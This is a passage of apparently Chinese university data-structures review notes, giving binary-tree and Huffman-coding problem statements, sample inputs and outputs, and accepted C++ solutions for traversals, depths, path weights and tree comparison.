NULL);\n\t\tT->setlson(buildtree(s, ++i));\n\t\tT->setrson(buildtree(s, ++i));\n\t}\n\treturn T;\n}\n\nvoid BItree::buildtree(string s)\n{\n\tint i = 0;\n\troot = buildtree(s, i);\n}\n\nvoid BItree::cntdepth()\n{\n\tcntdepth(root,0);\n}\n\nint BItree::cntdepth(BITnode* T, int d)\n{\n\tif (T)\n\t{\n\t\tint ls = cntdepth(T->getlson(), d + 1);\n\t\tint rs = cntdepth(T->getrson(), d + 1);\n\t\tif (ls == -1 && rs == -1)\n\t\t{\n\t\t\tmaxdepth = max(maxdepth, d + 1);\n\t\t}\n\t\treturn 1;\n\t}\n\treturn -1;\n}\n\nint main()\n{\n\tint t;\n\tstring tree;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> tree;\n\t\tBItree bt;\n\t\tbt.buildtree(tree);\n\t\tbt.cntdepth();\n\t\tcout << bt.getmaxdepth() << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS二叉树--层次遍历\n\n层次遍历：使用队列，类似于bfs思想\n\n题目:\n\n```\n层次遍历二叉树，是从根结点开始遍历，按层次次序“自上而下，从左至右”访问树中的各结点。\n建树方法采用“先序遍历+空树用0表示”的方法\n要求：采用队列对象实现，函数框架如下：\n\n输入\n第一行输入一个整数t，表示有t个测试数据\n第二行起输入二叉树先序遍历的结果，空树用字符‘0’表示，输入t行\n\n输出\n逐行输出每个二叉树的层次遍历结果\n```\n\n样例：\n\n```\n2\nAB0C00D00\nABCD00E000FG00H0I00\n```\n\n样例输出：\n\n```\nABDC\nABFCGHDEI\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<queue>\nusing namespace std;\n\nclass BITnode\n{\n\tbool vis = 0;\n\tchar node;\n\tBITnode* lson, * rson;\npublic:\n\tBITnode(char e, BITnode* l, BITnode* r) :node(e), lson(l), rson(r) {};\n\tchar getnode() { return node; }\n\tBITnode* getlson() { return lson; }\n\tBITnode* getrson() { return rson; }\n\tbool getvis() { return vis; }\n\tvoid setlson(BITnode* l) { lson = l; }\n\tvoid setrson(BITnode* r) { rson = r; }\n\tvoid setvis(bool v) { vis = v; }\n};\n\nclass BItree\n{\n\tBITnode* root;\n\tBITnode* buildtree(string s, int& i);\n\tqueue<BITnode>level;//level队列用于存放节点\n\npublic:\n\tBItree() { };\n\tvoid buildtree(string s);\n\tvoid LevelOrder();\n\tvoid printlevel();\n};\n\nBITnode* BItree::buildtree(string s, int& i)\n{\n\tBITnode* T = NULL;\n\tif (s[i] != '0')\n\t{\n\t\tT = new BITnode(s[i], NULL, NULL);\n\t\tT->setlson(buildtree(s, ++i));\n\t\tT->setrson(buildtree(s, ++i));\n\t}\n\treturn T;\n}\n\nvoid BItree::buildtree(string s)\n{\n\tint i = 0;\n\troot = buildtree(s, i);\n}\n\nvoid BItree::LevelOrder()\n{\n\tlevel.push(*root);\n\twhile (!level.empty())\n\t{\n\t\tBITnode *front = &level.front();\n\t\tBITnode* ls = front->getlson(), * rs = front->getrson();\n\t\tif (ls)level.push(*ls);\n\t\tif (rs)level.push(*rs);\n\t\tcout << front->getnode();\n\t\tlevel.pop();\n\t}\n}\n\nint main()\n{\n\tint t;\n\tstring tree;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> tree;\n\t\tBItree bt;\n\t\tbt.buildtree(tree);\n\t\tbt.LevelOrder();\n\t\tcout << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS二叉树—二叉树结点的最大距离\n\n题目:\n\n```\n二叉树两个结点的距离是一个结点经过双亲结点，祖先结点等中间结点到达另一个结点经过的分支数。二叉树结点的最大距离是所有结点间距离的最大值。例如，下图所示二叉树结点最大距离是3，C和D的距离。\n二叉树用先序遍历顺序创建，#表示空树。计算二叉树结点最大距离和最大距离的两个结点(假设二叉树中取最大距离的两个结点唯一）。\n\n输入\n测试次数T\n第2行之后的T行，每行为一棵二叉树先序遍历结果（#表示空树）\n\n输出\n对每棵二叉树，输出树的结点最大距离和最大距离的结点，输出格式见样例。\n```\n\n样例：\n\n```\n3\nA##\nABC##EF#G###D##\nABEH###F#K###\n```\n\n样例输出：\n\n```\n0:\n5:G D\n4:H K\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nstruct node\n{\n\tint d;\n\tchar data;\n};\n\nclass BITnode\n{\n\tchar node;\n\tBITnode* lson, *rson;\npublic:\n\tBITnode(char e, BITnode* l, BITnode* r) :node(e), lson(l), rson(r) {};\n\tchar getnode() { return node; }\n\tBITnode *getlson() { return lson; }\n\tBITnode* getrson() { return rson; }\n\tvoid setlson(BITnode* l) { lson = l; }\n\tvoid setrson(BITnode* r) { rson = r; }\n};\n\nclass BItree\n{\n\tint maxdis;//最大距离\n\tchar lch, rch;//找到的最大距离的左右节点内容\n\tBITnode* root;\n\tBITnode* buildtree(string s, int &i);\n\tvoid cntdepth(BITnode*T);\npublic:\n\tBItree() { maxdis = 0; };\n\tvoid buildtree(string s);\n\tvoid cntdepth();\n\tnode getsondepth(BITnode* T);\n\tvoid print();\n};\n\nBITnode * BItree::buildtree(string s, int& i)\n{\n\tBITnode* T = NULL;\n\tif (s[i] != '#')\n\t{\n\t\tT = new BITnode(s[i], NULL, NULL);\n\t\tT->setlson(buildtree(s, ++i));\n\t\tT->setrson(buildtree(s, ++i));\n\t}\n\treturn T;\n}\n\nvoid BItree::buildtree(string s)\n{\n\tint i = 0;\n\troot = buildtree(s, i);\n}\n\nvoid BItree::cntdepth()\n{\n\tcntdepth(root);\n}\n\nnode BItree::getsondepth(BITnode* T)\n{\n\tif (T)\n\t{\n\t\tnode ls = getsondepth(T->getlson());\n\t\tnode rs = getsondepth(T->getrson());\n\t\tif (ls.d + rs.d == 0)\n\t\t{\n\t\t\treturn { 1,T->getnode() };\n\t\t}\n\t\tif (ls.d > rs.d)return { 1 + ls.d,ls.data };\n\t\tif (ls.d < rs.d)return { 1 + rs.d,rs.data };\n\t}\n\treturn { 0,'0' };\n}//计算当前节点的最大距离，返左右子树中距离最大的节点数据\n\nvoid BItree::cntdepth(BITnode* T)\n{\n\tif (T)\n\t{\n\t\tnode ls = getsondepth(T->getlson());\n\t\tif (!ls.d)ls.data = T->getnode();\n\t\tnode rs = getsondepth(T->getrson());\n\t\tif (!rs.d)rs.data = T->getnode();//分别计算左右孩子的最大距离\n\t\tint dis = ls.d + rs.d;\n\t\tif (dis > maxdis)\n\t\t{\n\t\t\tmaxdis = dis;\n\t\t\tlch = ls.data, rch = rs.data;\n\t\t}//更新最大距离\n\t\tcntdepth(T->getlson());\n\t\tcntdepth(T->getrson());\n\t}\n}\n\nvoid BItree::print()\n{\n\tif (maxdis)\n\t{\n\t\tcout << maxdis << ':' << lch << ' ' << rch << endl;\n\t}\n\telse cout << \"0:\\n\";\n}\n\nint main()\n{\n\tint t;\n\tstring tree;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> tree;\n\t\tBItree bt;\n\t\tbt.buildtree(tree);\n\t\tbt.cntdepth();\n\t\tbt.print();\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS二叉树--后序遍历非递归算法\n\n使用栈实现\n\n题目:\n\n```\n求一颗树的后序遍历的非递归算法\n要求：必须是非递归算法，使用堆栈对象来实现\n建树方法采用“先序遍历+空树用0表示”的方法\n\n输入\n第一行输入一个整数t，表示有t个测试数据\n第二行起输入二叉树先序遍历的结果，空树用字符‘0’表示，输入t行\n\n输出\n逐行输出每个二叉树的后序遍历结果\n```\n\n样例：\n\n```\n3\nAB0C00D00\nABC00D00EF000\nABCD0000E0F00\n```\n\n样例输出：\n\n```\nCBDA\nCDBFEA\nDCBFEA\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<stack>\nusing namespace std;\n\nclass BITnode\n{\n\tchar node;\n\tbool vis = 0;\n\tBITnode* lson, *rson;\npublic:\n\tBITnode(char e, BITnode* l, BITnode* r) :node(e), lson(l), rson(r) {};\n\tchar getnode() { return node; }\n\tBITnode *getlson() { return lson; }\n\tBITnode* getrson() { return rson; }\n\tvoid setlson(BITnode* l) { lson = l; }\n\tvoid setrson(BITnode* r) { rson = r; }\n\tvoid setvis(bool v) { vis = v; }\n\tbool getvis() { return vis; }\n};\n\nclass BItree\n{\n\tstack<BITnode>s;\n\tBITnode* root;\n\tBITnode* buildtree(string s, int &i);\npublic:\n\tBItree() { };\n\tvoid buildtree(string s);\n\tvoid PostOrder();\n};\n\nBITnode * BItree::buildtree(string s, int& i)\n{\n\tBITnode* T = NULL;\n\tif (s[i] != '0')\n\t{\n\t\tT = new BITnode(s[i], NULL, NULL);\n\t\tT->setlson(buildtree(s, ++i));\n\t\tT->setrson(buildtree(s, ++i));\n\t}\n\treturn T;\n}\n\nvoid BItree::buildtree(string s)\n{\n\tint i = 0;\n\troot = buildtree(s, i);\n}\n\nvoid BItree::PostOrder()\n{\n\ts.push(*root);\n\troot->setvis(1);\n\twhile (!s.empty())\n\t{\n\t\tbool flag = 0;\n\t\tBITnode* top = &s.top(), * ls = top->getlson();\n\t\twhile (ls && !ls->getvis())\n\t\t{\n\t\t\tls->setvis(1);\n\t\t\ts.push(*ls);\n\t\t\tls = ls->getlson();\n\t\t\tflag = 1;\n\t\t}\n\t\ttop = &s.top();\n\t\tBITnode *rs = top->getrson();\n\t\tif (rs && !rs->getvis())s.push(*rs), flag = 1, rs->setvis(1);\n\t\tif (!flag)\n\t\t{\n\t\t\tcout << s.top().getnode();\n\t\t\ts.pop();\n\t\t}\n\t}\n}\n\nint main()\n{\n\tint t;\n\tstring tree;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> tree;\n\t\tBItree bt;\n\t\tbt.buildtree(tree);\n\t\tbt.PostOrder();\n\t\tcout << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### Huffman树\n\n在Huffman树中，权值最大的结点离根最近。\n\n权值最小的结点离根最远。\n\n构建Huffman树：每次合并权值最小的两棵子树\n\n**注意：Huffman树不一定是单侧的**\n\n单侧的情况：\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201141900305.png\" alt=\"image-20230201141900305\" style=\"zoom:50%;\" />\n\n非单侧的情况：\n\n<img src=\"../../../my/Study/2022-2023第一学期/数据结构/数据结构.assets/image-20230201141956123.png\" alt=\"image-20230201141956123\" style=\"zoom:50%;\" /><img src=\"深圳大学数据结构期末复习与实验代码/image-20230201142009062.png\" alt=\"image-20230201142009062\" style=\"zoom: 50%;\" />\n\n\n\n#### DS二叉树——Huffman编码与解码（不含代码框架）\n\n题目:\n\n```\n1、问题描述\n给定n个字符及其对应的权值，构造Huffman树，并进行huffman编码和译（解）码。\n构造Huffman树时，要求左子树根的权值小于、等于右子树根的权值。\n进行Huffman编码时，假定Huffman树的左分支上编码为‘0’，右分支上编码为‘1’。\n2、算法\n构造Huffman树算法：\n⑴根据给定的n个权值(w1, w2, …, wn)构成n棵二叉树的集合F={T1, T2, …, Tn}，其中每棵二叉树Ti中只有一个权值为wi的根结点。\n⑵在F中选取两棵根结点的权值最小的树，作为左、右子树构造一棵新的二叉树，且置其根结点的权值为其左、右子树权值之和。\n⑶在F中删除这两棵树，同时将新得到的二叉树加入F中。\n(4)重复⑵,⑶，直到F只含一棵树为止。\n3、Huffman编码算法：\n⑴从Huffman树的每一个叶子结点开始。\n⑵依次沿结点到根的路径，判断该结点是父亲结点的左孩子还是右孩子，如果是左孩子则得到编码‘0’，否则得到编码‘1’，先得到的编码放在后面。\n⑶直到到达根结点，编码序列即为该叶子结点对应的Huffman编码。\n4、Huffman译（解）码算法：\n⑴指针指向Huffman树的根结点，取第一个Huffman码。\n⑵如果Huffman码为‘0’，将指针指向当前结点的左子树的根结点；如果Huffman码为‘1’，将指针指向当前结点的右子树的根结点。\n⑶如果指针指向的当前结点为叶子结点，则输出叶子结点对应的字符；否则，取下一个Huffman码，并返回⑵。\n⑷如果Huffman码序列未结束，则返回⑴继续译码。\n\n输入\n第一行测试次数\n第2行：第一组测试数据的字符个数n，后跟n个字符\n第3行：第一组测试数据的字符权重\n待编码的字符串s1\n编码串s2\n其它组测试数据类推\n\n输出\n第一行~第n行,第一组测试数据各字符编码值\n第n+1行，串s1的编码值\n第n+2行，串s2的解码值，若解码不成功，输出error!\n其它组测试数据类推\n```\n\n样例：\n\n```\n2\n5 A B C D E\n15 4 4 3 2\nABDEC\n00000101100\n4 A B C D\n7 5 2 4\nABAD\n1110110\n```\n\n样例输出：\n\n```\nA :1\nB :010\nC :011\nD :001\nE :000\n1010001000011\nerror!\nA :0\nB :10\nC :110\nD :111\n0100111\nDAC\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<queue>\nusing namespace std;\n\nclass Huffmannode\n{\n\tchar data;\n\tint w, lc, rc, parent;\n\tstring code;\n\npublic:\n\tHuffmannode(char e =' ', int wv=0):data(e),w(wv),lc(-1),rc(-1),parent(-1),code(\"\"){}\n\tchar getdata() { return data; }\n\tvoid setw(int wv) { w = wv; }\n\tint getw() { return w; }\n\tvoid setlc(int l) { lc = l; }\n\tvoid setrc(int r) { rc = r; }\n\tvoid setpar(int p) { parent = p; }\n    //设置左孩子右孩子和双亲的函数\n\tint getlc() { return lc; }\n\tint getrc() { return rc; }\n\tint getpar() { return parent; }\n    //获取左孩子，右孩子和双亲编号\n\tstring getcode() { return code; }\n\tvoid setcode(string c) { code = c; }\n};\n\nclass Huffmantree\n{\n\tint n;\n\tHuffmannode ht[100];\n\tvoid select(int i, int& min1, int& min2);\n\tvoid coding();\npublic:\n\tHuffmantree(int nv, char* node, int* w);\n\tvoid buildtree();\n\tstring encode(string s);\n\tstring decode(string s);\n};\n\nHuffmantree::Huffmantree(int nv, char* node, int* w):n(nv)\n{\n\tfor (int i = 0; i < 2 * n - 1; i++)\n\t{\n\t\tht[i] = i < n ? Huffmannode(node[i], w[i]) : Huffmannode(' ', 0);\n\t}\n}//初始化Huffman树\n\nvoid Huffmantree::coding()\n{\n\tint k = 2 * n - 2;\n\tqueue<int>q;\n\tq.push(k);\n\twhile (!q.empty())\n\t{\n\t\tint top = q.front();\n\t\tint lc = ht[top].getlc(), rc = ht[top].getrc();\n\t\tif (lc != -1)q.push(lc), ht[lc].setcode(ht[top].getcode() + '0');//左支为0\n\t\tif (rc != -1)q.push(rc), ht[rc].setcode(ht[top].getcode() + '1');//右支为1\n\t\tq.pop();\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcout << ht[i].getdata() << \" :\" << ht[i].getcode() << endl;\n\t}\n}//Huffman编码\n\nvoid Huffmantree::select(int i, int& min1, int& min2)\n{\n\tmin1 = min2 = 0;\n\tint min1v, min2v;\n\tmin1v = min2v = 0x3f3f3f3f;\n\tfor (int j = 0; j < i; j++)\n\t{\n\t\tif (ht[j].getpar() == -1)\n\t\t{\n\t\t\tif (ht[j].getw() < min1v)\n\t\t\t{\n\t\t\t\tmin2v = min1v, min1v = ht[j].getw();\n\t\t\t\tmin2 = min1, min1 = j;\n\t\t\t}\n\t\t\telse if (ht[j].getw() < min2v)min2v = ht[j].getw(), min2 = j;\n\t\t}\n\t}\n}\n\nvoid Huffmantree::buildtree()\n{\n\tint min1, min2;\n\tfor (int i = n; i < 2 * n - 1; i++)\n\t{\n\t\tselect(i, min1, min2);\n\t\tht[i].setw(ht[min1].getw() + ht[min2].getw());\n\t\tht[min1].setpar(i);\n\t\tht[min2].setpar(i);\n\t\tht[i].setlc(min1);\n\t\tht[i].setrc(min2);\n\t}\n\tcoding();\n}//建树\n\nstring Huffmantree::encode(string s)\n{\n\tstring ans = \"\";\n\tfor (int i = 0; i < s.size(); i++)\n\t{\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tif (ht[j].getdata() == s[i])\n\t\t\t{\n\t\t\t\tans += ht[j].getcode();\n\t\t\t}\n\t\t}\n\t}\n\treturn ans;\n}//编码\n\nstring Huffmantree::decode(string s)\n{\n\tstring ans = \"\";\n\n\tint i = 0;\n\tint k = 2 * n - 2;//编号为2n-2的节点为树根\n\twhile (1)\n\t{\n\t\tif (ht[k].getlc() == -1 && ht[k].getrc() == -1)\n\t\t{\n\t\t\tans += ht[k].getdata();\n\t\t\tk = 2 * n - 2;//一次匹配完成后回到树根进行下一个词的匹配\n\t\t\tif (i == s.size())break;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tif (s[i] == '0')\n\t\t\t{\n\t\t\t\tk = ht[k].getlc();\n\t\t\t\ti++;\n\t\t\t}\n\t\t\telse k = ht[k].getrc(), i++;\n\t\t}\n\t\tif (i == s.size() + 1)break;\n\t}\n\tif (k == 2 * n - 2) return ans;\n\telse return \"error!\";//若解码完成后k没有回到树根则说明解码失败\n}//解码\n\n\nint main()\n{\n\tint t, n;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> n;\n\t\tchar* c = new char[n];\n\t\tint* w = new int[n];\n\t\tfor (int i = 0; i < n; i++)cin >> c[i];\n\t\tfor (int i = 0; i < n; i++)cin >> w[i];\n\t\tHuffmantree hft = Huffmantree(n, c, w);\n\t\thft.buildtree();\n\t\tstring enc, dec;\n\t\tcin >> enc >> dec;\n\t\tcout << hft.encode(enc) << endl;\n\t\tcout << hft.decode(dec) << endl;\n\t\tdelete[]c;\n\t\tdelete[]w;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS树--带权路径和\n\n题目:\n\n```\n计算一棵二叉树的带权路径总和，即求赫夫曼树的带权路径和。\n已知一棵二叉树的叶子权值，该二叉树的带权案路径和APL等于叶子权值乘于根节点到叶子的分支数，然后求总和。如下图中，叶子都用大写字母表示，权值对应为：A-7，B-6，C-2，D-3\n树的带权路径和 = 7*1 + 6*2 + 2*3 + 3*3 = 34\n```\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230130104857808.png\" alt=\"image-20230130104857808\" style=\"zoom:50%;\" />\n\n```\n本题二叉树的创建参考前面的方法\n\n输入\n第一行输入一个整数t，表示有t个二叉树\n第二行输入一棵二叉树的先序遍历结果，空树用字符‘0’表示，注意输入全是英文字母和0，其中大写字母表示叶子\n第三行先输入n表示有n个叶子，接着输入n个数据表示n个叶子的权值，权值的顺序和前面输入的大写字母顺序对应\n以此类推输入下一棵二叉树\n\n输出\n输出每一棵二叉树的带权路径和\n```\n\n\n\n样例：\n\n```\n2\nxA00tB00zC00D00\n4 7 6 2 3\nab0C00D00\n2 10 20\n```\n\n样例输出：\n\n```\n34\n40\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nclass BITnode\n{\n\tchar node;\n\tint w;\n\tBITnode* lson, *rson;\npublic:\n\tBITnode(char e, BITnode* l, BITnode* r, int wv = 0) :node(e), lson(l), rson(r),w(wv) {};\n\tchar getnode() { return node; }\n\tBITnode *getlson() { return lson; }\n\tBITnode* getrson() { return rson; }\n\tvoid setlson(BITnode* l) { lson = l; }\n\tvoid setrson(BITnode* r) { rson = r; }\n\tvoid setw(int wv) { w = wv; }\n\tint getw() { return w; }\n};\n\nclass BItree\n{\n\tint cnt = 0;\n\tBITnode* root;\n\tBITnode* buildtree(string s, int &i, int* w);\n\tint calweight(BITnode*T, int &sum, int dep);\npublic:\n\tBItree() {};\n\tvoid buildtree(string s, int *w);\n\tvoid calweight(int &sum);\n};\n\nBITnode * BItree::buildtree(string s, int& i, int *w)\n{\n\tBITnode* T = NULL;\n\tif (s[i] != '0')\n\t{\n\t\tT = new BITnode(s[i], NULL, NULL);\n\t\tif (s[i + 1] == '0' && s[i + 2] == '0')T->setw(w[cnt++]);\n\t\tT->setlson(buildtree(s, ++i,w));\n\t\tT->setrson(buildtree(s, ++i, w));\n\t}\n\treturn T;\n}\n\nvoid BItree::buildtree(string s, int *w)\n{\n\tint i = 0;\n\troot = buildtree(s, i, w);\n}\n\nvoid BItree::calweight(int &sum)\n{\n\tcalweight(root, sum, 0);\n}\n\nint BItree::calweight(BITnode* T, int &sum, int dep)\n{\n\tif (T)\n\t{\n\t\tint ls = calweight(T->getlson(), sum, dep+1);\n\t\tint rs = calweight(T->getrson(), sum, dep+1);\n\t\tif (ls == -1 && rs == -1)sum += T->getw() * dep;\n\t\treturn 1;\n\t}\n\treturn -1;\n}\n\nint main()\n{\n\tint t;\n\tstring tree;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tint n;\n\t\tcin >> tree >> n;\n\n\t\tint* w = new  int[n];\n\t\tfor (int i = 0; i < n; i++)cin >> w[i];\n\t\tBItree bt = BItree();\n\t\tbt.buildtree(tree, w);\n\t\tint sum = 0;\n\t\tbt.calweight(sum);\n\t\tcout << sum << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS树--二叉树之最大路径\n\n题目:\n\n```\n给定一颗二叉树的逻辑结构（先序遍历的结果，空树用字符‘0’表示，例如AB0C00D00），建立该二叉树的二叉链式存储结构\n二叉树的每个结点都有一个权值，从根结点到每个叶子结点将形成一条路径，每条路径的权值等于路径上所有结点的权值和。编程求出二叉树的最大路径权值。如下图所示，共有4个叶子即有4条路径，\n路径1权值=5 + 4 + 11 + 7 = 27路径2权值=5 + 4 + 11 + 2 = 22\n路径3权值=5 + 8 + 13 = 26路径4权值=5 + 8 + 4 + 1 = 18\n可计算出最大路径权值是27。\n该树输入的先序遍历结果为ABCD00E000FG00H0I00，各结点权值为：\nA-5，B-4，C-11，D-7，E-2，F-8，G-13，H-4，I-1\n```\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230130105007580.png\" alt=\"image-20230130105007580\" style=\"zoom:50%;\" />\n\n```\n输入\n第一行输入一个整数t，表示有t个测试数据\n第二行输入一棵二叉树的先序遍历，每个结点用字母表示\n第三行先输入n表示二叉树的结点数量，然后输入每个结点的权值，权值顺序与前面结点输入顺序对应\n以此类推输入下一棵二叉树\n\n输出\n每行输出每棵二叉树的最大路径权值，如果最大路径权值有重复，只输出1个\n```\n\n\n\n样例：\n\n```\n2\nAB0C00D00\n4 5 3 2 6\nABCD00E000FG00H0I00\n9 5 4 11 7 2 8 13 4 1\n```\n\n样例输出：\n\n```\n11\n27\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nclass BITnode\n{\n\tchar node;\n\tint w;\n\tBITnode* lson, *rson;\npublic:\n\tBITnode(char e, BITnode* l, BITnode* r, int wv = 0) :node(e), lson(l), rson(r),w(wv) {};\n\tchar getnode() { return node; }\n\tBITnode *getlson() { return lson; }\n\tBITnode* getrson() { return rson; }\n\tvoid setlson(BITnode* l) { lson = l; }\n\tvoid setrson(BITnode* r) { rson = r; }\n\tvoid setw(int wv) { w = wv; }\n\tint getw() { return w; }\n};\n\nclass BItree\n{\n\tint cnt = 0;\n\tint maxweight = 0;\n\tBITnode* root;\n\tBITnode* buildtree(string s, int &i, int* w);\n\tint calweight(BITnode*T, int &sum, int dep);\npublic:\n\tBItree() {};\n\tvoid buildtree(string s, int *w);\n\tvoid calweight(int &sum);\n\tint getmaxw() { return maxweight; }\n};\n\nBITnode * BItree::buildtree(string s, int& i, int *w)\n{\n\tBITnode* T = NULL;\n\tif (s[i] != '0')\n\t{\n\t\tT = new BITnode(s[i], NULL, NULL,w[cnt++]);\n\t\tT->setlson(buildtree(s, ++i,w));\n\t\tT->setrson(buildtree(s, ++i, w));\n\t}\n\treturn T;\n}\n\nvoid BItree::buildtree(string s, int *w)\n{\n\tint i = 0;\n\troot = buildtree(s, i, w);\n}\n\nvoid BItree::calweight(int &sum)\n{\n\tcalweight(root, sum, 0);\n}\n\nint BItree::calweight(BITnode* T, int &sum, int dep)\n{\n\tif (T)\n\t{\n\t\tsum += T->getw();\n\t\tint ls = calweight(T->getlson(), sum, dep+1);\n\t\tint rs = calweight(T->getrson(), sum, dep+1);\n\t\tif (ls == -1 && rs == -1)\n\t\t{\n\t\t\tmaxweight = max(maxweight, sum);\n\t\t}\n\t\tsum -= T->getw();\n\t\treturn 1;\n\t}\n\treturn -1;\n}\n\nint main()\n{\n\tint t;\n\tstring tree;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tint n;\n\t\tcin >> tree >> n;\n\n\t\tint* w = new  int[n];\n\t\tfor (int i = 0; i < n; i++)cin >> w[i];\n\t\tBItree bt = BItree();\n\t\tbt.buildtree(tree, w);\n\t\tint sum = 0;\n\t\tbt.calweight(sum);\n\t\tcout << bt.getmaxw() << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS二叉树—二叉树镜面反转\n\n题目:\n\n```\n假设二叉树用二叉链表存储，用先序序列结果创建。输入二叉树的先序序列，请你先创建二叉树，并对树做个镜面反转，再输出反转后的二叉树的先序遍历、中序遍历、后序遍历和层序遍历的序列。所谓镜面反转，是指将所有非叶结点的左右孩子对换。\n\n--程序要求--\n程序中不允许使用STL库等第三方对象或函数实现本题的要求\n\n输入\n测试次数t\n每组测试数据是一个二叉树的先序遍历序列，#表示空树\n\n输出\n对每棵二叉树，输出镜面反转后的先序、中序、后序和层次遍历序列。如果空树，输出四个NULL（后面不加空格，每个NULL独自一行，中间没有空行）。如下：\nNULL\nNULL\nNULL\nNULL\n```\n\n样例：\n\n```\n3\n41#32###65##7##\nAB#C##D##\nAB##C##\n```\n\n样例输出：\n\n```\n4 6 7 5 1 3 2 \n7 6 5 4 3 2 1 \n7 5 6 2 3 1 4 \n4 6 1 7 5 3 2 \nA D B C \nD A C B \nD C B A \nA D B C \nA C B \nC A B \nC B A \nA C B \n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<queue>\nusing namespace std;\n\nclass BITnode\n{\n\tchar node;\n\tBITnode* lson, *rson;\npublic:\n\tBITnode(char e, BITnode* l, BITnode* r) :node(e), lson(l), rson(r) {};\n\tchar getnode() { return node; }\n\tBITnode *getlson() { return lson; }\n\tBITnode* getrson() { return rson; }\n\tvoid setlson(BITnode* l) { lson = l; }\n\tvoid setrson(BITnode* r) { rson = r; }\n};\n\nclass BItree\n{\n\tBITnode* root;\n\tqueue<BITnode>level;\n\tvoid PreorderTraverse(BITnode* T);\n\tvoid MidorderTraverse(BITnode* T);\n\tvoid PostorderTraverse(BITnode* T);\n\tBITnode* buildtree(string s, int &i);\npublic:\n\tBItree() {};\n\tvoid PreorderTraverse();\n\tvoid MidorderTraverse();\n\tvoid PostorderTraverse();\n\tvoid buildtree(string s);\n\tvoid LevelOrder();\n};\n\nBITnode * BItree::buildtree(string s, int& i)\n{\n\tBITnode* T = NULL;\n\tif (s[i] != '#')\n\t{\n\t\tT = new BITnode(s[i], NULL, NULL);\n\t\tT->setrson(buildtree(s, ++i));\n\t\tT->setlson(buildtree(s, ++i));\n\t}\n\treturn T;\n}\n\nvoid BItree::buildtree(string s)\n{\n\tint i = 0;\n\troot = buildtree(s, i);\n}\n\nvoid BItree::PreorderTraverse(BITnode* T)\n{\n\tif (T)\n\t{\n\t\tcout << T->getnode() << ' ';\n\t\tPreorderTraverse(T->getlson());\n\t\tPreorderTraverse(T->getrson());\n\t}\n}\n\nvoid BItree::PreorderTraverse()\n{\n\tPreorderTraverse(root);\n}\n\nvoid BItree::MidorderTraverse()\n{\n\tMidorderTraverse(root);\n}\n\nvoid BItree::PostorderTraverse()\n{\n\tPostorderTraverse(root);\n}\n\nvoid BItree::MidorderTraverse(BITnode* T)\n{\n\tif (T)\n\t{\n\t\tMidorderTraverse(T->getlson());\n\t\tcout << T->getnode() << ' ';\n\t\tMidorderTraverse(T->getrson());\n\t}\n }\n\nvoid BItree::PostorderTraverse(BITnode* T)\n{\n\tif (T)\n\t{\n\t\tPostorderTraverse(T->getlson());\n\t\tPostorderTraverse(T->getrson());\n\t\tcout << T->getnode() << ' ';\n\t}\n}\n\nvoid BItree::LevelOrder()\n{\n\tlevel.push(*root);\n\twhile (!level.empty())\n\t{\n\t\tBITnode *front = &level.front();\n\t\tBITnode* ls = front->getlson(), * rs = front->getrson();\n\t\tif (ls)level.push(*ls);\n\t\tif (rs)level.push(*rs);\n\t\tcout << front->getnode() << ' ';\n\t\tlevel.pop();\n\t}\n}\n\nint main()\n{\n\tint t;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tstring tree;\n\t\tcin >> tree;\n\t\tif (tree == \"#\")\n\t\t{\n\t\t\tfor (int i = 0; i < 4; i++)cout << \"NULL\\n\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\tBItree bt = BItree();\n\t\t\tbt.buildtree(tree);\n\t\t\tbt.PreorderTraverse();\n\t\t\tcout << endl;\n\t\t\tbt.MidorderTraverse();\n\t\t\tcout << endl;\n\t\t\tbt.PostorderTraverse();\n\t\t\tcout << endl;\n\t\t\tbt.LevelOrder();\n\t\t\tcout << endl;\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS二叉树判断--同一棵二叉树？\n\n题目:\n\n```\n二叉树分别以数组存储方式创建、以先序遍历序列创建。输入二叉树的数组存储、先序遍历结果，判断根据它们创建的二叉树是否是同一棵二叉树。\n\n输入\n测试次数t\n每组测试数据两行：\n第一行：二叉树的数组存储（英文字母表示树结点，#表示空树）\n第二行：二叉树的先序遍历结果(英文字母表示树结点，#表示空树）\n\n输出\n对每组测试数据，如果两种方式创建的是同一棵二叉树，输出YES，否则，输出NO。\n```\n\n样例：\n\n```\n3\nABCDE\nABD##E##C##\nABC##DE####W##F\nAB##CDW###E#F##\nabc##d\nab##c#d##\n```\n\n样例输出：\n\n```\nYES\nYES\nNO\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<queue>\nusing namespace std;\n\nint Preorder(int id, string &ans, string tree)\n{\n\tif (id > tree.size() || tree[id - 1] == '#')return -1;\n\tif (tree[id - 1] != '#')\n\t{\n\t\tans += tree[id - 1];\n\t\tint ls = Preorder(id << 1, ans, 